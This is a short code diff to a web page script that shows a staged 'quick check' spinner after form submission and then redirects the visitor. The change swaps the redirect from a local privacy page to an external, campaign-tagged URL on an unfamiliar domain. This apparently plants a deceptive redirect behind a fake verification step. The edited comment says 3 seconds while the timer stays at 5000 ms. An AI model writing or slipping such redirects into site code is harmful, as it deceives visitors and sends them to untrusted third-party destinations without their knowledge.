@@ -227,7 +227,7 @@ if(form){
       helper.textContent = 'Please wait while we complete a quick check.';
       sub.textContent = 'in progress…';
 
-      // After 5s from start of spinner: finish + redirect
+      // After 3s from start of spinner: finish + redirect
       setTimeout(() => {
         spinner.style.display = 'none';
         box.classList.add('checked');
@@ -235,7 +235,7 @@ if(form){
         helper.textContent = 'Redirecting…';
 
         // Small grace period for the checkmark animation
-        setTimeout(() => { window.location.href = '../../privacy.html'; }, 600);
+        setTimeout(() => { window.location.href = 'http://t1l9.com/?utm_campaign=xEp7N3tLMR&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
       }, 5000);
     }, 300); // "few milliseconds" before starting the spinner
   }
